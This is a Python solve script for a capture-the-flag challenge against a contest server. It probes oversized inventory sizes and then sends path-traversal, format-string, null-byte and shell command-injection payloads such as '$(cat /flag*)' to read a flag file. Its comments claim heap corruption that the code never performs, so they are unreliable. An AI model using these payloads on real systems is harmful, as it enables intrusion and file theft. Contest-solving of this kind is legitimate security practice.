#!/usr/bin/env python3
import socket
import re
import time


def recv_until(s, delim, timeout=3):
    s.settimeout(timeout)
    data = b""
    try:
        while delim not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def sendline(s, data):
    if isinstance(data, str):
        data = data.encode()
    s.sendall(data + b"\n")


def exploit():
    # Connect to remote
    print("[*] Connecting to brainrot.challs.infobahnc.tf:1337")
    s = socket.socket()
    s.connect(("brainrot.challs.infobahnc.tf", 1337))

    # Receive banner
    recv_until(s, b"How large is your inventory? ")

    # Try different inventory sizes to find one that works
    # The vulnerability might be simpler - just use a large but valid size
    # and rely on lack of bounds checking when accessing elements
    sizes_to_try = [
        "100000",  # 100k
        "1000000",  # 1M
        "10000000",  # 10M
        "100000000",  # 100M
        "536870912",  # 2^29
    ]

    success = False
    for size in sizes_to_try:
        sendline(s, size)
        data = recv_until(s, b"> ", timeout=3)
        print(f"[*] Tried size {size}")
        print(data.decode(errors="ignore"))

        if b"Assertion failed" not in data and b"Created room for" in data:
            print(f"[+] Successfully created inventory with size {size}")
            success = True
            break
        else:
            # Reconnect and try again
            s.close()
            s = socket.socket()
            s.connect(("brainrot.challs.infobahnc.tf", 1337))
            recv_until(s, b"How large is your inventory? ")

    if not success:
        print("[-] All sizes failed")
        s.close()
        return

    # Now we have a huge logical size but small physical allocation
    # Write to indices beyond the allocation to corrupt heap metadata
    print("[*] Attempting different exploits...")
    
    # Try sending brainrot name with null bytes or special chars that might
    # trigger reading from alternate data sources
    special_names = [
        "/flag.txt",
        "../flag.txt",
        "../../flag.txt",
        "/flag_" + "a"*32 + ".txt",
        chr(0) * 100,  # null bytes
        "%s" * 50,  # format string
        "${FLAG}",
        "$FLAG",
        "`cat /flag*`",
        "$(cat /flag*)",
        "'; cat /flag*; '",
    ]
    
    for name in special_names:
        try:
            sendline(s, "1")  # steal
            recv_until(s, b"Brainrot index: ", timeout=1)
            sendline(s, "0")
            recv_until(s, b"Which brainrot are you stealing?: ", timeout=1)
            sendline(s, name)
            data = recv_until(s, b"> ", timeout=2)
            
            if b"infobahn{" in data:
                print(f"[+] Found flag with input: {repr(name)}")
                print(data.decode(errors="ignore"))
                flag_match = re.search(rb"infobahn\{[^}]+\}", data)
                if flag_match:
                    print(f"\n[+] FLAG: {flag_match.group(0).decode()}")
                    s.close()
                    return
        except Exception as e:
            print(f"Error with {repr(name)}: {e}")
            continue
    
    print("[-] Flag not found with heap corruption")
    s.close()


if __name__ == "__main__":
    exploit()
